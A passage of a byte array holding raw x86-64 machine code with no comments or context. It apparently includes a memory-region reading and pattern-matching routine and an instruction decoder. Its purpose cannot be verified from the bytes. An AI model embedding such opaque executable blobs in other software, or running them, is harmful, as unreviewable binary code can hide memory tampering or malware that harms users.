    0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x79, 0xB1, 0x00, 0x00, 0x48,
    0x89, 0xD8, 0x0F, 0x28, 0xB4, 0x24, 0x80, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x98, 0x01, 0x00,
    0x00, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0xFF, 0x15,
    0xA4, 0xB2, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x32, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x94,
    0x24, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x45, 0x31, 0xC0, 0xE9, 0xC3, 0xFD, 0xFF, 0xFF,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x0D, 0x31, 0x96, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x92, 0x9E,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0x9F, 0x7F, 0x00, 0x00, 0xFF, 0x15, 0x59, 0xB3, 0x00, 0x00, 0x48,
    0x8B, 0x15, 0x62, 0xB4, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x41, 0xB8, 0x08, 0x00, 0x00,
    0x00, 0xE8, 0x0A, 0x2B, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0x44, 0x24, 0x20, 0x48, 0x85, 0xC0, 0x74, 0x5B, 0x48, 0x83, 0x3D, 0x78, 0xB0, 0x00, 0x00, 0x00,
    0x74, 0x51, 0x48, 0x83, 0x3D, 0x76, 0xB0, 0x00, 0x00, 0x00, 0x74, 0x47, 0xC6, 0x00, 0x01, 0x48,
    0x8B, 0x05, 0x72, 0xB0, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x5B, 0xB0, 0x00, 0x00, 0x48, 0x89, 0x01,
    0x48, 0x63, 0x15, 0x0D, 0xAC, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x52, 0xB0, 0x00, 0x00, 0x41, 0xB0,
    0x01, 0xE8, 0xDA, 0x46, 0x00, 0x00, 0x4C, 0x63, 0x05, 0xF7, 0xAB, 0x00, 0x00, 0x48, 0x8B, 0x0D,
    0x3C, 0xB0, 0x00, 0x00, 0x31, 0xD2, 0xFF, 0x15, 0xEC, 0xB2, 0x00, 0x00, 0xB8, 0x1A, 0x09, 0x00,
    0x00, 0xEB, 0x1D, 0x48, 0x8D, 0x0D, 0x1A, 0x82, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xED, 0x9D, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x00, 0x7F, 0x00, 0x00, 0xFF, 0x15, 0xBA, 0xB2, 0x00, 0x00, 0x31, 0xC0,
    0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x68,
    0x06, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x50, 0x06, 0x00, 0x00, 0x4C, 0x89, 0xCE, 0x4C, 0x89,
    0xC7, 0x49, 0x89, 0xD6, 0x89, 0xC9, 0x48, 0x8D, 0x54, 0x24, 0x28, 0xFF, 0x15, 0x3F, 0xB1, 0x00,
    0x00, 0x85, 0xC0, 0x0F, 0x88, 0x5B, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xFF, 0x15,
    0x64, 0xB1, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x37, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4C,
    0x24, 0x28, 0x4C, 0x8D, 0x84, 0x24, 0x68, 0x01, 0x00, 0x00, 0x41, 0xB9, 0xE8, 0x02, 0x00, 0x00,
    0x48, 0x89, 0xC2, 0xE8, 0x98, 0x50, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x01, 0x00, 0x00,
    0x48, 0x85, 0xC0, 0x0F, 0x84, 0x0B, 0x02, 0x00, 0x00, 0x80, 0x78, 0x04, 0x00, 0x0F, 0x84, 0x01,
    0x02, 0x00, 0x00, 0x48, 0x8D, 0x9C, 0x24, 0x58, 0x01, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x4C, 0x89,
    0xF2, 0xFF, 0x15, 0xB9, 0xB1, 0x00, 0x00, 0x0F, 0x57, 0xF6, 0x0F, 0x29, 0x74, 0x24, 0x70, 0x0F,
    0x29, 0x74, 0x24, 0x60, 0x0F, 0x29, 0x74, 0x24, 0x50, 0x0F, 0x29, 0x74, 0x24, 0x40, 0x48, 0xC7,
    0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0x80, 0x01,
    0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x4C, 0x8D, 0x44, 0x24, 0x40, 0x41, 0xB9, 0x48, 0x00,
    0x00, 0x00, 0xE8, 0x29, 0x50, 0x00, 0x00, 0x48, 0x8B, 0x6C, 0x24, 0x50, 0x4C, 0x8D, 0xB4, 0x24,
    0x90, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0xBC, 0x24, 0x50, 0x04, 0x00, 0x00, 0x4C, 0x8D, 0x64, 0x24,
    0x30, 0x49, 0x89, 0xED, 0xEB, 0x2E, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0x4C, 0x24, 0x28, 0x41, 0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xEA, 0x4D, 0x89,
    0xE0, 0xE8, 0xEA, 0x4F, 0x00, 0x00, 0x4C, 0x8B, 0x6C, 0x24, 0x30, 0x49, 0x39, 0xED, 0x0F, 0x84,
    0x60, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x40, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24,
    0x30, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x20, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24,
    0x10, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x00, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24,
    0xF0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24,
    0xD0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24,
    0xB0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24,
    0x90, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0x50, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0x4C, 0x24, 0x28, 0x41, 0xB9, 0xC8, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xEA, 0x4D, 0x89,
    0xF0, 0xE8, 0x5A, 0x4F, 0x00, 0x00, 0x41, 0xB8, 0x00, 0x02, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0x31,
    0xD2, 0xE8, 0xFA, 0xD9, 0xFF, 0xFF, 0x0F, 0xB7, 0x84, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x66, 0x85,
    0xC0, 0x0F, 0x84, 0x39, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x94, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xD2, 0x0F, 0x84, 0x28, 0xFF, 0xFF, 0xFF, 0x0F, 0xB7, 0xC8, 0x81, 0xF9, 0xFE, 0x01, 0x00,
    0x00, 0xB9, 0xFE, 0x01, 0x00, 0x00, 0x0F, 0x42, 0xC8, 0x44, 0x0F, 0xB7, 0xC9, 0x48, 0x8B, 0x4C,
    0x24, 0x28, 0x4D, 0x89, 0xF8, 0xE8, 0x06, 0x4F, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00,
    0x00, 0x00, 0x00, 0x8B, 0x84, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0x4C, 0x89,
    0x7C, 0x24, 0x38, 0x4C, 0x89, 0xE1, 0x48, 0x89, 0xDA, 0x41, 0xB0, 0x01, 0xFF, 0x15, 0x3E, 0xB0,
    0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0xD6, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x9C, 0x24, 0xC0, 0x00,
    0x00, 0x00, 0x48, 0x85, 0xDB, 0x74, 0x4D, 0x44, 0x8B, 0xA4, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x45,
    0x85, 0xE4, 0x74, 0x40, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x31,
    0xC0, 0x45, 0x31, 0xC9, 0xFF, 0x15, 0xF6, 0xAD, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xD2,
    0x00, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x4E, 0x8D, 0x2C, 0x23, 0x49, 0x39, 0xDD, 0x77, 0x54, 0x48,
    0xC7, 0x06, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0xFF, 0x15,
    0xE4, 0xAD, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xFF, 0x15, 0x31, 0xAF, 0x00, 0x00, 0xB8,
    0x25, 0x02, 0x00, 0xC0, 0x0F, 0x28, 0xB4, 0x24, 0x50, 0x06, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x68,
    0x06, 0x00, 0x00, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3,
    0x48, 0x81, 0xC3, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81, 0xC4, 0x00, 0xF0, 0xFF, 0xFF, 0x4C, 0x39,
    0xEB, 0x73, 0xAC, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0x31, 0xD2, 0xFF, 0x15,
    0xE4, 0xAF, 0x00, 0x00, 0x49, 0x81, 0xFC, 0x00, 0x10, 0x00, 0x00, 0x41, 0xBF, 0x00, 0x10, 0x00,
    0x00, 0x4D, 0x0F, 0x42, 0xFC, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x89, 0xDA, 0x4D, 0x89, 0xF0,
    0x4D, 0x89, 0xF9, 0xE8, 0x08, 0x4E, 0x00, 0x00, 0x85, 0xC0, 0x78, 0xB4, 0x4C, 0x89, 0xF1, 0x4C,
    0x89, 0xFA, 0x49, 0x89, 0xF8, 0xE8, 0x46, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0xA1, 0x48,
    0x01, 0xD8, 0x48, 0x89, 0x06, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0xFF, 0x15, 0x45,
    0xAD, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xFF, 0x15, 0x92, 0xAE, 0x00, 0x00, 0x31, 0xC0,
    0xE9, 0x5F, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xFF, 0x15, 0x80, 0xAE, 0x00, 0x00,
    0xB8, 0x9A, 0x00, 0x00, 0xC0, 0xE9, 0x4A, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCB, 0x48, 0x8D, 0x4C,
    0x24, 0x28, 0x4C, 0x89, 0xC2, 0xE8, 0xB6, 0xEB, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48,
    0x8B, 0x44, 0x24, 0x30, 0x48, 0x85, 0xC9, 0x74, 0x5D, 0x48, 0x85, 0xC0, 0x74, 0x58, 0x48, 0x8B,
    0x54, 0x24, 0x38, 0x48, 0x29, 0xD7, 0x72, 0x53, 0x31, 0xF6, 0x48, 0x85, 0xD2, 0x74, 0x36, 0x45,
    0x31, 0xC0, 0xEB, 0x14, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x49, 0xFF, 0xC0, 0x4C, 0x39, 0xC2, 0x74, 0x1F, 0x42, 0x80, 0x3C, 0x00, 0x00, 0x74, 0xF1, 0x46,
    0x0F, 0xB6, 0x0C, 0x03, 0x46, 0x3A, 0x0C, 0x01, 0x74, 0xE6, 0x48, 0xFF, 0xC6, 0x48, 0xFF, 0xC3,
    0x48, 0x39, 0xFE, 0x76, 0xC5, 0x31, 0xF6, 0x31, 0xD2, 0xFF, 0x15, 0x09, 0xAE, 0x00, 0x00, 0x48,
    0x8B, 0x4C, 0x24, 0x30, 0xEB, 0x1C, 0x48, 0x85, 0xC9, 0x74, 0x0D, 0x31, 0xD2, 0xFF, 0x15, 0xF5,
    0xAD, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x31, 0xF6, 0x48, 0x85, 0xC0, 0x74, 0x0B, 0x48,
    0x89, 0xC1, 0x31, 0xD2, 0xFF, 0x15, 0xDE, 0xAD, 0x00, 0x00, 0x48, 0x89, 0xF0, 0x48, 0x83, 0xC4,
    0x40, 0x5B, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x83, 0xF8, 0x04, 0x77, 0x19, 0x4C, 0x8D,
    0x15, 0xBF, 0x67, 0x00, 0x00, 0x49, 0x63, 0x04, 0x82, 0x4C, 0x01, 0xD0, 0xFF, 0xE0, 0x48, 0x83,
    0xC4, 0x28, 0xE9, 0xC9, 0x32, 0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x28, 0xE9, 0x2F, 0x39, 0x00,
    0x00, 0xC6, 0x44, 0x24, 0x20, 0x00, 0xEB, 0x05, 0xC6, 0x44, 0x24, 0x20, 0x01, 0xE8, 0x8E, 0x3C,
    0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x89, 0xD1, 0x4C, 0x89, 0xC2, 0x45, 0x89, 0xC8,
    0x48, 0x83, 0xC4, 0x28, 0xE9, 0x97, 0x1A, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x10,
    0x49, 0x89, 0xCD, 0x0F, 0x57, 0xC0, 0x0F, 0x11, 0x42, 0x10, 0x0F, 0x11, 0x02, 0xC6, 0x42, 0x24,
    0x00, 0xC7, 0x42, 0x20, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x59, 0x01, 0x41, 0xB0, 0xF0, 0x31,
    0xC9, 0x4C, 0x8D, 0x15, 0x50, 0x67, 0x00, 0x00, 0xEB, 0x19, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
    0x40, 0x88, 0x7A, 0x03, 0x41, 0xB3, 0x40, 0x44, 0x08, 0xD9, 0x4D, 0x8D, 0x59, 0x01, 0x41, 0xFE,
    0xC0, 0x74, 0x7F, 0x4D, 0x89, 0xD9, 0x41, 0x0F, 0xB6, 0x7B, 0xFF, 0x44, 0x0F, 0xB6, 0xDF, 0x41,
    0x81, 0xFB, 0xEF, 0x00, 0x00, 0x00, 0x7F, 0x28, 0x41, 0x83, 0xC3, 0xDA, 0x41, 0x83, 0xFB, 0x41,
    0x77, 0x60, 0x4F, 0x63, 0x1C, 0x9A, 0x4D, 0x01, 0xD3, 0x41, 0xFF, 0xE3, 0xC6, 0x42, 0x04, 0x66,
    0x41, 0xB3, 0x08, 0xEB, 0xC2, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x41, 0x81, 0xFB, 0xF0, 0x00, 0x00, 0x00, 0x74, 0x24, 0x41, 0x81, 0xFB, 0xF2, 0x00, 0x00, 0x00,
    0x74, 0x24, 0x41, 0x81, 0xFB, 0xF3, 0x00, 0x00, 0x00, 0x75, 0x27, 0xC6, 0x42, 0x01, 0xF3, 0x41,
    0xB3, 0x04, 0xEB, 0x93, 0xC6, 0x42, 0x05, 0x67, 0x41, 0xB3, 0x10, 0xEB, 0x8A, 0xC6, 0x42, 0x02,
    0xF0, 0x41, 0xB3, 0x20, 0xEB, 0x81, 0xC6, 0x42, 0x01, 0xF2, 0x41, 0xB3, 0x02, 0xE9, 0x75, 0xFF,
    0xFF, 0xFF, 0x0F, 0xB6, 0xC9, 0x89, 0xCD, 0xC1, 0xE5, 0x17, 0x80, 0xF9, 0x02, 0x41, 0xBA, 0x01,
    0x00, 0x00, 0x00, 0x44, 0x0F, 0x43, 0xD1, 0x89, 0x6A, 0x21, 0x89, 0xF9, 0x80, 0xE1, 0xF0, 0x80,
    0xF9, 0x40, 0x75, 0x1B, 0x81, 0xCD, 0x00, 0x00, 0x00, 0x40, 0x89, 0x6A, 0x21, 0x89, 0xF9, 0xC0,
    0xE9, 0x03, 0x80, 0xE1, 0x01, 0x88, 0x4A, 0x07, 0x75, 0x0A, 0x45, 0x31, 0xFF, 0xEB, 0x13, 0x45,
    0x31, 0xFF, 0xEB, 0x44, 0x41, 0x0F, 0xB6, 0x09, 0x80, 0xE1, 0xF8, 0x80, 0xF9, 0xB8, 0x41, 0x0F,
    0x94, 0xC7, 0x89, 0xF9, 0xC0, 0xE9, 0x02, 0x80, 0xE1, 0x01, 0x88, 0x4A, 0x08, 0x89, 0xF9, 0xD0,
    0xE9, 0x80, 0xE1, 0x01, 0x88, 0x4A, 0x09, 0x40, 0x80, 0xE7, 0x01, 0x40, 0x88, 0x7A, 0x0A, 0x41,
    0x0F, 0xB6, 0x39, 0x49, 0xFF, 0xC1, 0x89, 0xF9, 0x80, 0xE1, 0xF0, 0x80, 0xF9, 0x40, 0x75, 0x08,
    0x45, 0x31, 0xE4, 0xE9, 0x88, 0x00, 0x00, 0x00, 0x40, 0x88, 0x7A, 0x0B, 0x40, 0x80, 0xFF, 0x0F,
    0x75, 0x17, 0x45, 0x0F, 0xB6, 0x21, 0x49, 0xFF, 0xC1, 0x44, 0x88, 0x62, 0x0C, 0x48, 0x8D, 0x0D,
    0x46, 0xA8, 0x00, 0x00, 0x44, 0x89, 0xE7, 0xEB, 0x2A, 0x41, 0x89, 0xF8, 0x41, 0x80, 0xE0, 0xFC,
    0x48, 0x8D, 0x0D, 0xE9, 0xA7, 0x00, 0x00, 0x41, 0x80, 0xF8, 0xA0, 0x75, 0x13, 0x41, 0xFE, 0xC7,
    0x41, 0xF6, 0xC2, 0x10, 0x75, 0x06, 0x41, 0x80, 0xE2, 0xF7, 0xEB, 0x04, 0x41, 0x80, 0xCA, 0x08,
    0x45, 0x31, 0xE4, 0x44, 0x0F, 0xB6, 0xC7, 0x45, 0x89, 0xC3, 0x41, 0xC1, 0xEB, 0x02, 0x46, 0x0F,
    0xB6, 0x1C, 0x19, 0x41, 0x83, 0xE0, 0x03, 0x4D, 0x01, 0xD8, 0x42, 0x0F, 0xB6, 0x34, 0x01, 0x48,
    0x81, 0xFE, 0xFF, 0x00, 0x00, 0x00, 0x74, 0x18, 0x40, 0x84, 0xF6, 0x79, 0x28, 0x83, 0xE6, 0x7F,
    0x0F, 0xB7, 0x34, 0x31, 0x89, 0xF1, 0xC1, 0xE9, 0x08, 0x45, 0x84, 0xE4, 0x75, 0x1E, 0xEB, 0x54,
    0x81, 0xCD, 0x00, 0x30, 0x00, 0x00, 0x89, 0x6A, 0x21, 0x89, 0xF9, 0x80, 0xE1, 0xFD, 0x80, 0xF9,
    0x24, 0x40, 0x0F, 0x94, 0xC6, 0x31, 0xC9, 0x45, 0x84, 0xE4, 0x74, 0x38, 0x44, 0x0F, 0xB6, 0xC7,
    0x45, 0x89, 0xC3, 0x41, 0xC1, 0xEB, 0x02, 0x48, 0x8D, 0x1D, 0x9E, 0xA8, 0x00, 0x00, 0x4C, 0x8D,
    0x35, 0x5B, 0xA7, 0x00, 0x00, 0x47, 0x0F, 0xB6, 0x9C, 0x33, 0x3C, 0x01, 0x00, 0x00, 0x41, 0x83,
    0xE0, 0x03, 0x4D, 0x01, 0xD8, 0x46, 0x84, 0x14, 0x03, 0x74, 0x09, 0x81, 0xCD, 0x00, 0x30, 0x00,
    0x00, 0x89, 0x6A, 0x21, 0x40, 0xF6, 0xC6, 0x01, 0x75, 0x3C, 0x41, 0xF6, 0xC2, 0x20, 0x74, 0x09,
    0x81, 0xCD, 0x00, 0x90, 0x00, 0x00, 0x89, 0x6A, 0x21, 0x40, 0xF6, 0xC6, 0x10, 0x0F, 0x85, 0xA4,
    0x03, 0x00, 0x00, 0x40, 0xF6, 0xC6, 0x04, 0x0F, 0x85, 0x05, 0x04, 0x00, 0x00, 0x40, 0xF6, 0xC6,
    0x02, 0x0F, 0x85, 0x17, 0x04, 0x00, 0x00, 0x40, 0xF6, 0xC6, 0x40, 0x0F, 0x84, 0x23, 0x04, 0x00,
    0x00, 0xE9, 0x39, 0x04, 0x00, 0x00, 0x44, 0x89, 0x7C, 0x24, 0x0C, 0x4C, 0x89, 0x2C, 0x24, 0x89,
    0xEB, 0x83, 0xCB, 0x01, 0x89, 0x5A, 0x21, 0x45, 0x0F, 0xB6, 0x29, 0x44, 0x88, 0x6A, 0x0D, 0x45,
    0x89, 0xEE, 0x41, 0xC0, 0xEE, 0x06, 0x44, 0x88, 0x72, 0x0E, 0x45, 0x89, 0xEF, 0x41, 0x80, 0xE7,
    0x07, 0x44, 0x88, 0x7A, 0x10, 0x45, 0x89, 0xE8, 0x41, 0xC1, 0xE8, 0x03, 0x41, 0x83, 0xE0, 0x07,
    0x44, 0x88, 0x42, 0x0F, 0x84, 0xC9, 0x74, 0x1A, 0x44, 0x0F, 0xB6, 0xD9, 0x44, 0x89, 0xC1, 0x41,
    0xD3, 0xE3, 0x45, 0x84, 0xDB, 0x79, 0x0B, 0x81, 0xCD, 0x01, 0x30, 0x00, 0x00, 0x89, 0x6A, 0x21,
    0x89, 0xEB, 0x8D, 0x4F, 0x27, 0x80, 0xF9, 0x06, 0x77, 0x4B, 0x45, 0x84, 0xE4, 0x75, 0x46, 0x41,
    0x80, 0xFE, 0x03, 0x0F, 0xB6, 0xC9, 0x4C, 0x8D, 0x1D, 0x83, 0xA6, 0x00, 0x00, 0x4A, 0x8D, 0xAC,
    0x19, 0xFD, 0x00, 0x00, 0x00, 0x49, 0x8D, 0x0C, 0xCB, 0x4D, 0x8D, 0x9C, 0x08, 0x04, 0x01, 0x00,
    0x00, 0x4C, 0x0F, 0x45, 0xDD, 0x41, 0x0F, 0xB6, 0xEF, 0x41, 0x0F, 0xB6, 0xC8, 0x0F, 0x44, 0xCD,
    0x45, 0x0F, 0xB6, 0x1B, 0x41, 0xD2, 0xE3, 0x45, 0x84, 0xDB, 0x79, 0x09, 0x81, 0xCB, 0x00, 0x30,
    0x00, 0x00, 0x89, 0x5A, 0x21, 0x41, 0xF6, 0xC2, 0x20, 0x74, 0x6B, 0x41, 0x80, 0xFE, 0x03, 0x74,
    0x5C, 0x41, 0x89, 0xFB, 0x41, 0x80, 0xE3, 0xFE, 0x45, 0x84, 0xE4, 0x48, 0x8D, 0x0D, 0xDC, 0xA7,
    0x00, 0x00, 0x48, 0x8D, 0x05, 0xED, 0xA7, 0x00, 0x00, 0x48, 0x0F, 0x45, 0xC8, 0x48, 0x8D, 0x2D,
    0xF4, 0xA7, 0x00, 0x00, 0x48, 0x0F, 0x44, 0xE8, 0x40, 0x0F, 0xB6, 0xC7, 0x45, 0x0F, 0xB6, 0xDB,
    0x44, 0x0F, 0x45, 0xD8, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x44, 0x38, 0x19, 0x74, 0x0B, 0x48, 0x83, 0xC1, 0x02, 0x48, 0x39, 0xE9, 0x75, 0xF2, 0xEB, 0x0D,
    0x0F, 0xB6, 0x41, 0x01, 0x44, 0x89, 0xC1, 0xD3, 0xE0, 0x84, 0xC0, 0x79, 0x09, 0x81, 0xCB, 0x00,
    0x90, 0x00, 0x00, 0x89, 0x5A, 0x21, 0x45, 0x84, 0xE4, 0x74, 0x35, 0x40, 0x0F, 0xB6, 0xCF, 0x44,
    0x8D, 0x59, 0xE0, 0x41, 0x83, 0xFB, 0x03, 0x0F, 0x87, 0x89, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05,
    0xDC, 0x64, 0x00, 0x00, 0x4A, 0x63, 0x0C, 0x98, 0x48, 0x01, 0xC1, 0xFF, 0xE1, 0x41, 0xB6, 0x03,
    0x41, 0x80, 0xF8, 0x04, 0x0F, 0x87, 0x96, 0x00, 0x00, 0x00, 0x41, 0x80, 0xF8, 0x01, 0xEB, 0x3A,
    0x40, 0x80, 0xFF, 0x8E, 0x74, 0x43, 0x40, 0x0F, 0xB6, 0xC7, 0x3D, 0x8C, 0x00, 0x00, 0x00, 0x4C,
    0x8B, 0x2C, 0x24, 0x74, 0x42, 0x41, 0x80, 0xFE, 0x03, 0x0F, 0x85, 0xD8, 0x00, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0x52, 0xA7, 0x00, 0x00, 0x4C, 0x8D, 0x25, 0x5A, 0xA7, 0x00, 0x00, 0xEB, 0x51, 0x41,
    0x80, 0xE5, 0x30, 0x41, 0xB6, 0x03, 0x41, 0x80, 0xFD, 0x20, 0x4C, 0x8B, 0x2C, 0x24, 0x0F, 0x85,
    0xB3, 0x00, 0x00, 0x00, 0xE9, 0xA5, 0x00, 0x00, 0x00, 0x41, 0x80, 0xF8, 0x01, 0x4C, 0x8B, 0x2C,
    0x24, 0x0F, 0x84, 0x97, 0x00, 0x00, 0x00, 0x41, 0x80, 0xF8, 0x05, 0x0F, 0x86, 0x96, 0x00, 0x00,
    0x00, 0xE9, 0x88, 0x00, 0x00, 0x00, 0x41, 0x80, 0xFE, 0x03, 0x75, 0x3F, 0x48, 0x8D, 0x0D, 0x14,
    0xA7, 0x00, 0x00, 0x4C, 0x8D, 0x25, 0x37, 0xA7, 0x00, 0x00, 0x4C, 0x8B, 0x2C, 0x24, 0x66, 0x90,
    0x40, 0x38, 0x39, 0x74, 0x11, 0x48, 0x83, 0xC1, 0x03, 0x4C, 0x39, 0xE1, 0x75, 0xF2, 0xEB, 0x67,
    0x4C, 0x8B, 0x2C, 0x24, 0xEB, 0x58, 0x44, 0x84, 0x51, 0x01, 0x74, 0x5B, 0x0F, 0xB6, 0x41, 0x02,
    0x44, 0x89, 0xC1, 0xD3, 0xE0, 0x84, 0xC0, 0x78, 0x4E, 0xEB, 0x43, 0x81, 0xF9, 0xD5, 0x00, 0x00,
    0x00, 0x7E, 0x22, 0x81, 0xF9, 0xD6, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x2C, 0x24, 0x0F, 0x84, 0x5F,
    0x02, 0x00, 0x00, 0x81, 0xF9, 0xF7, 0x00, 0x00, 0x00, 0x74, 0x1D, 0x81, 0xF9, 0xD7, 0x00, 0x00,
    0x00, 0x74, 0x15, 0xEB, 0x22, 0x83, 0xF9, 0x50, 0x4C, 0x8B, 0x2C, 0x24, 0x74, 0x0A, 0x81, 0xF9,
    0xC5, 0x00, 0x00, 0x00, 0x74, 0x08, 0xEB, 0x0F, 0x41, 0xF6, 0xC2, 0x09, 0x74, 0x09, 0x81, 0xCB,
    0x00, 0x10, 0x01, 0x00, 0x89, 0x5A, 0x21, 0x41, 0x80, 0xF8, 0x01, 0x77, 0x15, 0x40, 0x80, 0xFF,
    0xF7, 0x74, 0x3C, 0x40, 0x0F, 0xB6, 0xC7, 0x3D, 0xF6, 0x00, 0x00, 0x00, 0x75, 0x04, 0x40, 0x80,
    0xCE, 0x02, 0x41, 0x80, 0xFE, 0x02, 0x74, 0x31, 0x41, 0x0F, 0xB6, 0xCE, 0x83, 0xF9, 0x01, 0x74,
    0x16, 0x85, 0xC9, 0x75, 0x16, 0x41, 0xF6, 0xC2, 0x10, 0x75, 0x2C, 0x41, 0x80, 0xFF, 0x05, 0x0F,
    0x94, 0xC1, 0xC0, 0xE1, 0x02, 0xEB, 0x29, 0xB1, 0x01, 0xEB, 0x25, 0x31, 0xC9, 0xEB, 0x21, 0x40,
    0x80, 0xCE, 0x10, 0x41, 0x80, 0xFE, 0x02, 0x75, 0xCF, 0x41, 0xF6, 0xC2, 0x10, 0x0F, 0x94, 0xC1,
